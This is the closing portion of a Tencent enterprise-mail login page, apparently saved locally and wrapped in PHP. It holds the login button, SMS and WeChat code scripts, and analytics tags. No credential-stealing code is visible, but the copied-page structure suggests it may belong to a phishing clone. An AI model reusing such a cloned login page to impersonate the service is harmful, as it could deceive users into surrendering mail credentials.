</script><div id="auto_login_tips" style="display:none; visibility:hidden; position: absolute; width: 190px;  background: #aaa; left: 5px; top: 30px; background:#fdfde4;color:#d88708; padding: 5px 0 5px 5px;"><div>为了您的帐号安全，请勿在网吧或公用电脑上使用此功能！</div></div></div><div><input class="green_btn" value="登 录" id="btlogin" name="btlogin" type="submit"></div><div class="forget_pwd_wrap"><img src="%E8%85%BE%E8%AE%AF%E4%BC%81%E4%B8%9A%E9%82%AE%E7%AE%B1-%E7%99%BB%E5%BD%95%E5%85%A5%E5%8F%A3_files/lock_new25de0f.png" alt=" https 安全方式登录" style="margin:-3px 5px auto 2px!important;margin:-3px 4px 0 0;" align="absmiddle">正在使用https方式登录<a href="https://exmail.qq.com/cgi-bin/readtemplate?check=false&amp;t=biz_rf_portal#recovery">忘记密码？</a></div></div></div></div><div class="middle_line"> </div>   </form></div></div><script>init();</script><div id="tipsContainer" style="display:none;"><div id="tipsTop" class="tipsWrap topPos size14" style="display:none;"><span class="msg"></span></div><div id="tipsMsg" class="tipsWrap tipsCenter size14" style="display:none;"><span class="msg"></span></div><div id="tipsProcess" class="tipsWrap tipsCenter size14" style="display:none;"><span class="msg" style="background-color:gray;"></span></div><div id="tipsError" class="tipsWrap tipsCenter size14" style="display:none;"><span class="msg" style="background-color:orange;"></span></div></div><div style="clear:both;"></div><div class="wd txt_center"><div class="navPageBottom"><a href="http://www.tencent.com/" target="_blank">关于腾讯</a><a href="https://exmail.qq.com/cgi-bin/bizmail_portal?t=bizmail_eula" target="_blank">服务条款</a><a href="http://service.exmail.qq.com/" target="_blank">帮助中心</a><a href="https://exmail.qq.com/cgi-bin/download?path=manual&amp;filename=%CC%DA%D1%B6%C6%F3%D2%B5%D3%CA%CF%E4%D3%C3%BB%A7%CA%B9%D3%C3%CA%D6%B2%E1.pdf">用户手册</a><a href="https://exmail.qq.com/portal/charges/dealeradd" target="_blank" style="border-right:none;">合作加盟</a></div><div class="copyright cLight">© 1998 - 2018 Tencent Inc. All Rights Reserved&nbsp;&nbsp; </div></div><script src="%E8%85%BE%E8%AE%AF%E4%BC%81%E4%B8%9A%E9%82%AE%E7%AE%B1-%E7%99%BB%E5%BD%95%E5%85%A5%E5%8F%A3_files/wxLogin.js"></script><script>
var wait = false,
timer;
function pushSms()
{
if(wait){
return ;
}

QMAjax.send("/cgi-bin/bizmail_portal?action=send_sms&mobile&type=9&t=biz_rf_portal_mgr&ef=jsnew&resp_charset=UTF8",
{       
method  : "GET", 
onload  : function(_abIsOk, _asParam)
{       
var _oData = evalValue( _asParam );
if(_abIsOk)
{ 
if(_oData.retcode == "0")
{
showMsgTips('动态密码发送成功');
wait = true;
countdown(60);
}
else if(_oData.retcode == "-1")
{
S("msgContainer").innerHTML = '身份校验失败，请返回登录页重新输入帐号密码。';
}
else if(_oData.retcode == "-2")
{
S("msgContainer").innerHTML = '尚未绑定手机，无法发送验证码。';
}
else if(_oData.retcode == "-101")
{
S("msgContainer").innerHTML = '操作速度过快，请1分钟后重新尝试。';
setTimeout(function()
{
S("msgContainer").innerHTML = '';
}, 10000);
}
}
}
});
}
    function countdown(time_sec){
        if (time_sec > 0){
wait = true;
            var next_sec = time_sec -1;
            var s = next_sec +  "秒后可重新获取";
            addClass(S("btn_sms"), "disabled");
            setHTML(S("btn_sms"), s);
            timer = setTimeout(function(){countdown(next_sec)}, 1000);
        }else{
wait = false;
            rmClass(S("btn_sms"), "disabled");
setHTML(S("btn_sms"), "获取验证码");
        }
    };

    function clearTimer(){
        clearTimeout(timer);
        countdown(0);
    } 
function checkSms()
{
var _sToken = document.form1.sms_token.value;
if(document.form1.domain.value === "")
{
document.form1.domain.value = "biz.mail.qq.com";
}
if( location.host == 'mail.exmail.qq.com' )
{
document.form1.domain_bak.value = '1';
}

if(_sToken)
{
document.form1.submit();
S("msgContainer").innerHTML = '';
}
else
{
S("msgContainer").innerHTML = '请输入验证码';
setTimeout(function()
{
S("msgContainer").innerHTML = '';
}, 6000);

}
}
function showTips(element, message, delay)
{
S('tipsContainer').style.display = "block";
element.innerHTML = "<span class='msg'>" + message + "</span>"
element.style.display = "block";
setTimeout(
function()
{
S('tipsContainer').style.display = "none";
element.style.display = "none";
}, 
delay || 2000
);
};
function showErr(message, delay)
{
showTips(S("tipsError"), message, delay);
}
function showMsgTips(message, delay)
{
showTips(S("tipsMsg"), message, delay);
}
function pushToken()
{
QMAjax.send("/cgi-bin/wx_token?act=push_token",
{       
method  : "GET", 
onload  : function(_abIsOk, _asParam)
{       
var _oData = evalValue( _asParam );
if(_abIsOk && _oData.errcode == "0")
{
//show(S("token_errMsg"), true);
S("msgContainer").innerHTML = '已经发送';
setTimeout(function()
{
S("msgContainer").innerHTML = '';
}, 3000);
}
}
});
}
function checkToken()
{
var _sToken = document.form1.wx_token.value;
if(_sToken)
{
document.form1.submit();
S("msgContainer").innerHTML = '';
}
else
{
S("msgContainer").innerHTML = '请输入动态密码';
}
}

var redirect_uri = 'http://m.exmail.qq.com/cgi-bin/loginpage?t=login_refresh&domain_bak=' + location.hostname;

var wxlogin = new WxLogin({
id : 'qr_con', //只能是以id开始的容器，二维码会被放到这个容器里面
appid : 'wxc43a4974a9baf4f7',  //在微信申请到的appid,
scope : 'snsapi_login,snsapi_userinfo',  //授权作用域
redirect_uri : encodeURIComponent(redirect_uri),
style: "",
href : 'https%3a%2f%2fexmail.qq.com%2fbizmail%2fzh_CN%2fhtmledition%2fstyle%2flogin_qrcode25cd5e.css' 
});

function HideLabel(id){
try{
S(id).style.display = "none";
}catch(ex){}
}
function ShowLabel(id){
try{
S(id).style.display = "block";
}catch(ex){}
}

(function(){
if(!('placeholder' in document.createElement('input')))
{

ShowLabel("uin_tip");
ShowLabel("pwd_tip");
ShowLabel("verify_tip");
ShowLabel("token_tip");

var timer_uin = setInterval(function(){
try{
if(S("inputuin").value.length > 0){
HideLabel("uin_tip");
clearInterval(timer_uin);
}
}catch(ex){
clearInterval(timer_uin);
}
}, 200);
var timer_pwd = setInterval(function(){
try{
if(S("pp").value.length > 0){
HideLabel("pwd_tip");
clearInterval(timer_pwd);
}
}catch(ex){
clearInterval(timer_uin);
}
}, 200);
var timer_verify = setInterval(function(){
try{
if(S("vc").value.length > 0 ){
HideLabel("verify_tip");
clearInterval(timer_verify);
}
}catch(ex){
clearInterval(timer_verify);
}
}, 200);
var timer_token = setInterval(function(){
try{
if(S("wx_token").value.length > 0 ){
HideLabel("token_tip");
clearInterval(timer_token);
}
}catch(ex){
clearInterval(timer_token);
}
}, 200);
var timer_sms_token = setInterval(function(){
try{
if(S("sms_token").value.length > 0 ){
HideLabel("token_tip");
clearInterval(timer_sms_token);
}
}catch(ex){
clearInterval(timer_sms_token);
}
}, 200);

}
})();
</script><script src="%E8%85%BE%E8%AE%AF%E4%BC%81%E4%B8%9A%E9%82%AE%E7%AE%B1-%E7%99%BB%E5%BD%95%E5%85%A5%E5%8F%A3_files/hm.js"></script><script id="baidustatic">
var _hmt = _hmt || [];
(function() {
var hm = document.createElement("script");
hm.src = "//hm.baidu.com/hm.js?bdfb0d7298c0c5a5a2475c291ac7aca2";
var s = document.getElementById("baidustatic");
s.parentNode.insertBefore(hm, s);
})();
 </script><script type="text/javascript" src="%E8%85%BE%E8%AE%AF%E4%BC%81%E4%B8%9A%E9%82%AE%E7%AE%B1-%E7%99%BB%E5%BD%95%E5%85%A5%E5%8F%A3_files/stats" charset="UTF-8"></script><script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-43277770-1', 'exmail.qq.com');
  ga('send', 'pageview');

</script><script>
BJ_REPORT.init({
  id: 1230
});
BJ_REPORT.tryJs().spyAll();
</script></body></html><?php } ?>